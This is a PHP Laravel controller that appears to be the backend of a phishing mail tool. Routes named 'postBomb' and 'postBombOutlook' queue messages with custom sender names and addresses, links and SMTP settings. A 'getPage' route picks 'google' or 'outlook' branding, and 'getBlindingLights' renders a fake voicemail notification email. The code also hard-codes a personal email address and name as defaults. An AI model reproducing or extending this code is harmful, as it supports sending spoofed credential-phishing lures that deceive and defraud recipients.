<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex(Request $request)
    {
		$secure = 'false';
        $ret = null;
	    //dd($secure);
    	return view("index",compact(['secure']));
    }
    
   
   /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getTemplate()
    {
        $ret = null;
	
    	return view("template");
    }
    
   
    
    
    public function postBomb(Request $request)
	{
           $req = $request->all();
		   //dd($req);
           $ret = "";
              #{'msg':msg,'em':em,'subject':subject,'link':link,'sn':senderName,'se':senderEmail,'ss':SMTPServer,'sp':SMTPPort,'su':SMTPUser,'spp':SMTPPass,'sa':SMTPAuth};
                $validator = Validator::make($req, [
                             'em' => 'required|email',
                             'msg' => 'required',
                             'subject' => 'required',
                             'sn' => 'required',
                             'se' => 'required|email',
                             'attt' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = json_encode(["op" => "mailer","status" => "error-validation"]);
                       
                 }
                
                 else
                 {              	 
                      //$msg = $req["msg"];
                       $em = $req["em"];
                       $title = $req["subject"];

                       //$ret =  $this->helpers->bomb($req);     
                        $this->helpers->bombOutlook($req);
             			$ret = ['status' => "ok",'message' => "Queued. Thank you."];		
                  }       
           return $ret;                                                                                            
	}
	
	public function postBombOutlook(Request $request)
	{
           $req = $request->all();
		   //dd($req);
           $ret = "";
              #{'msg':msg,'em':em,'subject':subject,'link':link,'sn':senderName,'se':senderEmail,'ss':SMTPServer,'sp':SMTPPort,'su':SMTPUser,'spp':SMTPPass,'sa':SMTPAuth};
                $validator = Validator::make($req, [
                             'em' => 'required|email',
                             'user' => 'required',
                             'nname' => 'required',
                             'duration' => 'required',
                             'ddate' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = json_encode(["op" => "mailer","status" => "error-validation"]);
                       
                 }
                
                 else
                 {              	    
                        $this->helpers->bombOutlook($req);
             			$ret = json_encode(['status' => "ok",'message' => "Queued. Thank you."]);		
                  }       
           return $ret;                                                                                            
	}
	
	public function getBomb(Request $request)
	{
		$ret = $this->helpers->defaultBomb();
		return $ret;
	}
	public function getPage(Request $request)
	{
		$req = $request->all();
		$s = $req['service'];
		if($s == "1"){
			$ret = "google";
		}
		elseif($s == "13"){
			$ret = "outlook";
		}
		
		return $ret;
	}
	public function getBlindingLights(Request $request)
	{
		$req = $request->all();
		   //dd($req);
           $ret = "";
                $validator = Validator::make($req, [
                             'em' => 'required|email',
                             'nname' => 'required',
                             'duration' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                      $nname = "Roy J";
		$duration = "0:27";	
                       $em = "dunphydavid83@gmail.com";
                 }
                
                 else
                 {              	    
                     $nname = $req['nname'];
		$duration = $req['duration'];	
		$em = $req['em'];	
                  }       
		$ddate = date("jS F, Y h: i A");
		return view('emails.voicemail_2',compact(['em','nname','ddate','duration']));
	}
	
}